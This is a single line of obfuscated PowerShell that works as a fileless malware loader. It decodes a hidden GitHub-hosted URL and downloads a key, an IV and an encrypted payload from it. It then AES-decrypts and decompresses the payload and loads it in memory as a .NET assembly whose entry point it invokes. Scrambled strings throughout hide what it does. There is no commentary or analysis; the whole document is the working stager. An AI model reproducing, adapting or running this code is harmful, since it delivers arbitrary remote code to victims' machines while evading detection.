$vzBfL='BzAmEBzAmnBzAmtBzAmBzAmrBzAmyBzAmPBzAmoBzAmiBzAmnBzAmtBzAm'.replace('BzAm',''),'sOLIIsOLInsOLIvsOLIosOLIksOLIesOLI'.replace('sOLI',''),'FkeETrkeETokeETmkeETBkeETakeETskeETekeET6keET4keETSkeETtkeETrkeETikeETnkeETgkeET'.replace('keET',''),'ChRdpohRdpnhRdpthRdpehRdpnhRdpthRdp'.replace('hRdp',''),'MQFySMQFypMQFylMQFyiMQFytMQFy'.replace('MQFy',''),'QvWFLQvWFoQvWFaQvWFdQvWF'.replace('QvWF',''),'DGVcgeGVcgcGVcgoGVcgmGVcgpGVcgrGVcgeGVcgsGVcgs'.replace('GVcg',''),'TtCLrrtCLratCLrntCLrstCLrftCLrotCLrrtCLrmtCLrFtCLritCLrntCLratCLrltCLrBtCLrltCLrotCLrctCLrktCLr'.replace('tCLr',''),'CFBSJrFBSJeFBSJaFBSJtFBSJeFBSJDFBSJeFBSJcFBSJrFBSJyFBSJpFBSJtFBSJoFBSJr'.replace('FBSJ',''),'sVTYDsVTYisVTYssVTYpsVTYosVTYssVTYe'.replace('sVTY',''),'wKrSCwKrSrwKrSewKrSawKrStwKrSewKrS'.replace('wKrS','');function aEDEJ($GQhgkB){$LHjnZ=[System.Security.Cryptography.Aes]::($vzBfL[10])();$LHjnZ.Mode=[System.Security.Cryptography.CipherMode]::CBC;$LHjnZ.Padding=[System.Security.Cryptography.PaddingMode]::PKCS7;$LHjnZ.Key=[System.Convert]::($vzBfL[2])($isQZnx[1]);$LHjnZ.IV=[System.Convert]::($vzBfL[2])($isQZnx[2]);$iGwjDp=$LHjnZ.($vzBfL[8])();$PmiIAq=$iGwjDp.($vzBfL[7])($GQhgkB,0,$GQhgkB.Length);$iGwjDp.($vzBfL[9])();$LHjnZ.($vzBfL[9])();$PmiIAq;}function glEYS($GQhgkB){$soxLxr=New-Object System.IO.MemoryStream(,$GQhgkB);$PwkZpj=New-Object System.IO.MemoryStream;$bYJmlv=New-Object System.IO.Compression.GZipStream($soxLxr,[IO.Compression.CompressionMode]::($vzBfL[6]));$bYJmlv.CopyTo($PwkZpj);$bYJmlv.($vzBfL[9])();$soxLxr.($vzBfL[9])();$PwkZpj.($vzBfL[9])();$PwkZpj.ToArray();}$AXTqWG=[System.Text.Encoding]::UTF8.GetString(([System.Convert]::($vzBfL[2])('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2Jhdjk0L2EvbWFpbi9k')));$isQZnx=((Invoke-WebRequest -Uri $AXTqWG).($vzBfL[3])).($vzBfL[4])(':');$FPJHgE=glEYS (aEDEJ ([Convert]::($vzBfL[2])($isQZnx[0])));[System.Reflection.Assembly]::($vzBfL[5])([byte[]]$FPJHgE).($vzBfL[0]).($vzBfL[1])($null,$null);
